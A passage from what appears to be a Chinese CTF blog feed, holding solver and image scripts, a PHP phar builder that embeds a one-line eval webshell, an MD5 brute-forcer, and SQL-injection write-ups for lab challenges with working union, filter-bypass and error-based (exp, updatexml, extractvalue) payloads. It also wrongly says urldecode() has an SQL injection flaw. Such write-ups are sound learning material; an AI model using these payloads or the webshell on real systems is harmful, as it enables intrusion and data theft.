class="number">132</span>*v33+<span class="number">804</span>*v34==<span class="number">9953220</span>)</span><br><span class="line">s.add(<span class="number">67</span>*v0+<span class="number">776</span>*v1+<span class="number">816</span>*v2+<span class="number">372</span>*v3+<span class="number">553</span>*v4+<span class="number">169</span>*v5+<span class="number">596</span>*v6+<span class="number">85</span>*v7+<span class="number">991</span>*v8+<span class="number">97</span>*v9+<span class="number">931</span>*v10+<span class="number">735</span>*v11+<span class="number">960</span>*v12+<span class="number">336</span>*v13+<span class="number">482</span>*v14+<span class="number">243</span>*v15+<span class="number">512</span>*v16+<span class="number">910</span>*v17+<span class="number">722</span>*v18+<span class="number">276</span>*v19+<span class="number">381</span>*v20+<span class="number">495</span>*v21+<span class="number">349</span>*v22+<span class="number">121</span>*v23+<span class="number">366</span>*v24+<span class="number">693</span>*v25+<span class="number">496</span>*v26+<span class="number">727</span>*v27+<span class="number">615</span>*v28+<span class="number">42</span>*v29+<span class="number">974</span>*v30+<span class="number">876</span>*v31+<span class="number">698</span>*v32+<span class="number">816</span>*v33+<span class="number">414</span>*v34==<span class="number">10782865</span>)</span><br><span class="line">s.add(<span class="number">529</span>*v0+<span class="number">755</span>*v1+<span class="number">674</span>*v2+<span class="number">262</span>*v3+<span class="number">667</span>*v4+<span class="number">119</span>*v5+<span class="number">855</span>*v6+<span class="number">1003</span>*v7+<span class="number">912</span>*v8+<span class="number">414</span>*v9+<span class="number">1012</span>*v10+<span class="number">122</span>*v11+<span class="number">592</span>*v12+<span class="number">443</span>*v13+<span class="number">829</span>*v14+<span class="number">169</span>*v15+<span class="number">556</span>*v16+<span class="number">17</span>*v17+<span class="number">476</span>*v18+<span class="number">954</span>*v19+<span class="number">751</span>*v20+<span class="number">203</span>*v21+<span class="number">39</span>*v22+<span class="number">667</span>*v23+<span class="number">413</span>*v24+<span class="number">744</span>*v25+<span class="number">66</span>*v26+<span class="number">120</span>*v27+<span class="number">322</span>*v28+<span class="number">895</span>*v29+<span class="number">389</span>*v30+<span class="number">573</span>*v31+<span class="number">499</span>*v32+<span class="number">377</span>*v33+<span class="number">351</span>*v34==<span class="number">9924122</span>)</span><br><span class="line">s.add(<span class="number">727</span>*v0+<span class="number">717</span>*v1+<span class="number">559</span>*v2+<span class="number">922</span>*v3+<span class="number">527</span>*v4+<span class="number">512</span>*v5+<span class="number">1000</span>*v6+<span class="number">333</span>*v7+<span class="number">790</span>*v8+<span class="number">901</span>*v9+<span class="number">42</span>*v10+<span class="number">420</span>*v11+<span class="number">585</span>*v12+<span class="number">408</span>*v13+<span class="number">988</span>*v14+<span class="number">94</span>*v15+<span class="number">945</span>*v16+<span class="number">331</span>*v17+<span class="number">704</span>*v18+<span class="number">651</span>*v19+<span class="number">130</span>*v20+<span class="number">796</span>*v21+<span class="number">795</span>*v22+<span class="number">322</span>*v23+<span class="number">88</span>*v24+<span class="number">776</span>*v25+<span class="number">299</span>*v26+<span class="number">972</span>*v27+<span class="number">616</span>*v28+<span class="number">909</span>*v29+<span class="number">820</span>*v30+<span class="number">617</span>*v31+<span class="number">439</span>*v32+<span class="number">721</span>*v33+<span class="number">176</span>*v34==<span class="number">10760304</span>)</span><br><span class="line">s.add(<span class="number">434</span>*v0+<span class="number">861</span>*v1+<span class="number">873</span>*v2+<span class="number">935</span>*v3+<span class="number">582</span>*v4+<span class="number">543</span>*v5+<span class="number">33</span>*v6+<span class="number">741</span>*v7+<span class="number">897</span>*v8+<span class="number">208</span>*v9+<span class="number">571</span>*v10+<span class="number">294</span>*v11+<span class="number">868</span>*v12+<span class="number">302</span>*v13+<span class="number">362</span>*v14+<span class="number">885</span>*v15+<span class="number">318</span>*v16+<span class="number">39</span>*v17+<span class="number">274</span>*v18+<span class="number">833</span>*v19+<span class="number">573</span>*v20+<span class="number">732</span>*v21+<span class="number">526</span>*v22+<span class="number">542</span>*v23+<span class="number">312</span>*v24+<span class="number">454</span>*v25+<span class="number">187</span>*v26+<span class="number">15</span>*v27+<span class="number">616</span>*v28+<span class="number">45</span>*v29+<span class="number">243</span>*v30+<span class="number">732</span>*v31+<span class="number">841</span>*v32+<span class="number">439</span>*v33+<span class="number">80</span>*v34==<span class="number">9838513</span>)</span><br><span class="line">s.add(<span class="number">843</span>*v0+<span class="number">931</span>*v1+<span class="number">854</span>*v2+<span class="number">1</span>*v3+<span class="number">564</span>*v4+<span class="number">889</span>*v5+<span class="number">799</span>*v6+<span class="number">655</span>*v7+<span class="number">610</span>*v8+<span class="number">196</span>*v9+<span class="number">227</span>*v10+<span class="number">456</span>*v11+<span class="number">325</span>*v12+<span class="number">270</span>*v13+<span class="number">99</span>*v14+<span class="number">513</span>*v15+<span class="number">372</span>*v16+<span class="number">664</span>*v17+<span class="number">765</span>*v18+<span class="number">817</span>*v19+<span class="number">328</span>*v20+<span class="number">820</span>*v21+<span class="number">810</span>*v22+<span class="number">305</span>*v23+<span class="number">731</span>*v24+<span class="number">683</span>*v25+<span class="number">85</span>*v26+<span class="number">409</span>*v27+<span class="number">456</span>*v28+<span class="number">134</span>*v29+<span class="number">836</span>*v30+<span class="number">342</span>*v31+<span class="number">385</span>*v32+<span class="number">196</span>*v33+<span class="number">760</span>*v34==<span class="number">10335141</span>)</span><br><span class="line">s.add(<span class="number">711</span>*v0+<span class="number">59</span>*v1+<span class="number">806</span>*v2+<span class="number">683</span>*v3+<span class="number">462</span>*v4+<span class="number">270</span>*v5+<span class="number">832</span>*v6+<span class="number">257</span>*v7+<span class="number">531</span>*v8+<span class="number">990</span>*v9+<span class="number">605</span>*v10+<span class="number">436</span>*v11+<span class="number">620</span>*v12+<span class="number">928</span>*v13+<span class="number">880</span>*v14+<span class="number">987</span>*v15+<span class="number">354</span>*v16+<span class="number">815</span>*v17+<span class="number">679</span>*v18+<span class="number">483</span>*v19+<span class="number">135</span>*v20+<span class="number">949</span>*v21+<span class="number">756</span>*v22+<span class="number">66</span>*v23+<span class="number">315</span>*v24+<span class="number">718</span>*v25+<span class="number">799</span>*v26+<span class="number">269</span>*v27+<span class="number">960</span>*v28+<span class="number">193</span>*v29+<span class="number">547</span>*v30+<span class="number">780</span>*v31+<span class="number">767</span>*v32+<span class="number">1010</span>*v33+<span class="number">762</span>*v34==<span class="number">11888742</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解数独后进行拼图"><a href="#解数独后进行拼图" class="headerlink" title="解数独后进行拼图"></a>解数独后进行拼图</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">name_list = [[<span class="number">11</span>, <span class="number">27</span>, <span class="number">32</span>, <span class="number">44</span>, <span class="number">58</span>, <span class="number">63</span>, <span class="number">76</span>, <span class="number">85</span>, <span class="number">99</span>],</span><br><span class="line">             [<span class="number">13</span>, <span class="number">25</span>, <span class="number">38</span>, <span class="number">49</span>, <span class="number">56</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">82</span>, <span class="number">94</span>],</span><br><span class="line">             [<span class="number">14</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">47</span>, <span class="number">52</span>, <span class="number">65</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">93</span>],</span><br><span class="line">             [<span class="number">12</span>, <span class="number">24</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">69</span>, <span class="number">75</span>, <span class="number">83</span>, <span class="number">96</span>],</span><br><span class="line">             [<span class="number">19</span>, <span class="number">23</span>, <span class="number">35</span>, <span class="number">46</span>, <span class="number">57</span>, <span class="number">64</span>, <span class="number">72</span>, <span class="number">81</span>, <span class="number">98</span>],</span><br><span class="line">             [<span class="number">18</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">62</span>, <span class="number">79</span>, <span class="number">84</span>, <span class="number">97</span>],</span><br><span class="line">             [<span class="number">17</span>, <span class="number">22</span>, <span class="number">34</span>, <span class="number">43</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">89</span>, <span class="number">91</span>],</span><br><span class="line">             [<span class="number">16</span>, <span class="number">21</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">54</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">87</span>, <span class="number">95</span>],</span><br><span class="line">             [<span class="number">15</span>, <span class="number">28</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">67</span>, <span class="number">74</span>, <span class="number">86</span>, <span class="number">92</span>]]</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">"./image/image.png"</span>)  <span class="comment"># 读取要操作的图片</span></span><br><span class="line"></span><br><span class="line">width, height = img.size          <span class="comment"># 获取图片的宽度和高度</span></span><br><span class="line"></span><br><span class="line">crop_width = width // <span class="number">9</span>           <span class="comment"># 截切后图片的宽度</span></span><br><span class="line">crop_height = height // <span class="number">9</span>         <span class="comment"># 截切后图片的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用循环将原图片截成 9*9 个图片，并保存</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        box = (crop_width * j, crop_height * i, crop_width * (j + <span class="number">1</span>), crop_height * (i + <span class="number">1</span>))    <span class="comment"># 截切下来的图片在原图片的位置 （left，up，right，down）</span></span><br><span class="line">        new_img = img.crop(box)</span><br><span class="line">        name = <span class="string">"./image/"</span> + str(name_list[i][j]) + <span class="string">".png"</span></span><br><span class="line">        new_img.save(name)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="生成phar文件的php脚本"><a href="#生成phar文件的php脚本" class="headerlink" title="生成phar文件的php脚本"></a>生成phar文件的php脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub;</span></span><br><span class="line"><span class="comment">//$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.php"</span>, <span class="string">"&lt;?php eval(\$_POST[123]); ?&gt;"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="二进制转二维码"><a href="#二进制转二维码" class="headerlink" title="二进制转二维码"></a>二进制转二维码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">187</span></span><br><span class="line">img = Image.new(<span class="string">"RGB"</span>,(MAX,MAX))</span><br><span class="line">str = <span class="string">"01字符串"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">'1'</span>):</span><br><span class="line">            img.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="MD5截断比较爆破"><a href="#MD5截断比较爆破" class="headerlink" title="MD5截断比较爆破"></a>MD5截断比较爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">knownMd5 = <span class="string">'9ccde'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(text)</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span><span class="params">(code)</span>:</span>   </span><br><span class="line">    key = code.split(<span class="string">':'</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])  </span><br><span class="line">    end = int(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">5</span>] == knownMd5:            </span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">list=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">':'</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()</span><br><span class="line">pool.map(findCode, list) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 脚本 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一些和sql注入有关的web题wp]]></title>
      <url>/ctf-writeup-web/ckwd5ws9q005bd0uc2zl3t3tg/</url>
      <content type="html"><![CDATA[<h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php</a></p>
<p>页面：<br>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 2</p>
<p>Notice: Undefined index: id in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 2</p>
<p>Deprecated: Function eregi() is deprecated in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 2</p>
<p>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 7</p>
<p>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 7</p>
<p>Notice: Undefined index: id in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 7</p>
<p>Notice: Use of undefined constant id - assumed ‘id’ in C:\h43a1W3\phpstudy\WWW\DUTCTF\index.php on line 8</p>
<p>Can you authenticate to this website? index.php.txt</p>
<p>访问index.php.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure>
<p>eregi()函数查找数组中的字符串，当查找到“hackerDJ”时输出“not allowed！”<br>urldecode()函数存在sql注入漏洞，会对字符串进行二次编码<br>只要输入二次编码后的字符串就行<br>%25解码后为%，与后面的68结合成%68进行二次解码，解码为h</p>
<p>payload:<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568ackerDJ" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568ackerDJ</a></p>
<hr>
<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><a href="http://ctf5.shiyanbar.com/web/upload" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/upload</a></p>
<p>进入是个文件上传页面，尝试上传一句话木马（.php），提示必须上传图片格式<br>上传图片后提示后缀必须为.php<br>文件上传绕过，有四种方法：文件名大小写绕过，特殊文件名绕过，0x00截断绕过，.htaccess文件攻击<br>这题用%00截断</p>
<hr>
<h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p>提示有过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a></p>
<p>源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>flag<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>到底过滤了什么东西？<span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>查看源代码发现是get传参<br>id=1,name=baloteli<br>1’  报错<br>查表字段union select  被过滤<br>unionunion selectselect  空格被过滤<br>试了一堆，过滤了and、union、select、空格、from和where，所以构造语句要写两遍<br>用database()函数查看id下的信息<br>1’  unionunion  selectselect  database()’<br>出现web1用户<br>ID: 1’  union select database()’<br>name: baloteli<br>ID: 1’  union select database()’<br>name: web1<br>接着查表</p>
<hr>
<h4 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h4><p>对于mysql和Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。<br>information_schema.tables存储了数据表的元数据信息，下面对常用的字段进行介绍：<br>table_schema: 记录数据库名；<br>table_name: 记录数据表名；<br>engine : 存储引擎；<br>table_rows: 关于表的粗略行估计；<br>data_length : 记录表的大小（单位字节）；<br>index_length : 记录表的索引的大小；<br>row_format: 可以查看数据表是否压缩过；</p>
<hr>
<p>语句：1’  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  ‘1’=’1</p>
<p>出现两条关键语句<br>ID: 1’  union select table_name  from information_schema.tables  where ‘1’=’1<br>name: admin<br>ID: 1’  union select table_name  from information_schema.tables  where ‘1’=’1<br>name: flag</p>
<p>再查询字段名：<br>1’ unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name=’flag</p>
<p>ID: 1’ union select column_name  from information_schema.columns  where table_name=’flag<br>name: baloteli<br>ID: 1’ union select column_name  from information_schema.columns  where table_name=’flag<br>name: flag<br>ID: 1’ union select column_name  from information_schema.columns  where table_name=’flag<br>name: id</p>
<p>出现flag字段，最后直接查flag<br>1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere  ‘1’=’1</p>
<p>得到flag</p>
<hr>
<h2 id="简单的sql注入2"><a href="#简单的sql注入2" class="headerlink" title="简单的sql注入2"></a>简单的sql注入2</h2><p>提示有回显<br><a href="http://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php</a></p>
<p>按照上一题的思路<br>输入1，1’报错，1 ‘  回显SQLi detected!<br>空格被过滤<br><code>1&#39; union select table_name from information_schema.tables where &#39;1&#39;=&#39;1</code><br>空格用/<strong>/代替<br>`1’/</strong>/union/<strong>/select/</strong>/table_name/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/‘1’=’1`<br>得到关键语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&apos;1&apos;=&apos;1</span><br><span class="line">name: admin</span><br><span class="line">ID: 1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&apos;1&apos;=&apos;1</span><br><span class="line">name: flag</span><br><span class="line">ID: 1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&apos;1&apos;=&apos;1</span><br><span class="line">name: web_1</span><br></pre></td></tr></table></figure></p>
<p>接着查字段名<br><code>1&#39; union select column_name from information_schema.columns where table_name=&#39;flag</code><br><code>1&#39;/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag</code><br>得到flag字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos;/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&apos;flag</span><br><span class="line">name: flag</span><br></pre></td></tr></table></figure></p>
<p>查flag<br><code>1&#39; union select flag from flag where &#39;1&#39;=&#39;1</code><br><code>1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code><br>得到flag</p>
<hr>
<h2 id="简单的sql注入3"><a href="#简单的sql注入3" class="headerlink" title="简单的sql注入3"></a>简单的sql注入3</h2><p>提示mysql报错注入<br><a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php</a></p>
<p>输入1，出现Hello！<br>输入1’，报错：<br>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\h43a1W3\phpstudy\WWW\web\index_3.php on line 30<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1<br>报错提示了<code>mysql_fetch_array()</code>函数<br>函数定义:<br>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
<hr>
<h4 id="上网找了十种mysql报错注入函数"><a href="#上网找了十种mysql报错注入函数" class="headerlink" title="上网找了十种mysql报错注入函数"></a>上网找了十种mysql报错注入函数</h4><p>1.floor()</p>
<p><code>select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></p>
<p>2.extractvalue()</p>
<p><code>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></p>
<p>3.updatexml()</p>
<p><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></p>
<p>4.geometrycollection()</p>
<p><code>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></p>
<p>5.multipoint()</p>
<p><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></p>
<p>6.polygon()</p>
<p><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></p>
<p>7.multipolygon()</p>
<p><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></p>
<p>8.linestring()</p>
<p><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></p>
<p>9.multilinestring()</p>
<p><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></p>
<p>10.exp()</p>
<p><code>select * from test where id=1 and exp(~(select * from(select user())a));</code></p>
<hr>
<p>尝试发现前三个函数均返回Don’t!,尝试用exp()<br>爆库名:<code>&#39;or EXP(~(SELECT * from(select database())a))#</code><br>出现  <code>DOUBLE value is out of range in &#39;exp(~((select &#39;web1&#39; from dual)))&#39;</code><br>爆表名：<code>&#39;or EXP(~(SELECT * from(select group_concat(table_name) from information_schema.tables where table_schema=database())a))#</code><br>出现  <code>DOUBLE value is out of range in &#39;exp(~((select &#39;flag,web_1&#39; from dual)))&#39;</code><br>爆列名：<code>&#39;or EXP(~(SELECT * from(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;)a))#</code><br>出现  <code>DOUBLE value is out of range in &#39;exp(~((select &#39;flag,id&#39; from dual)))&#39;</code><br>查flag：<code>&#39;or EXP(~(SELECT * from(select group_concat(flag) from flag)a))#</code><br>得到flag<br><code>DOUBLE value is out of range in &#39;exp(~((select &#39;flag{Y0u_@r3_5O_dAmn_90Od}&#39; from dual)))&#39;</code></p>
<hr>
<h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p>相信你一定能拿到想要的<br>Hint:你可能希望知道服务器端发生了什么。。<br><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/kzhan.php</a></p>
<p>查看源码，发现是post传参<br>随便传个username和password值，用burpsuite抓包，改cookie里source=1，得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 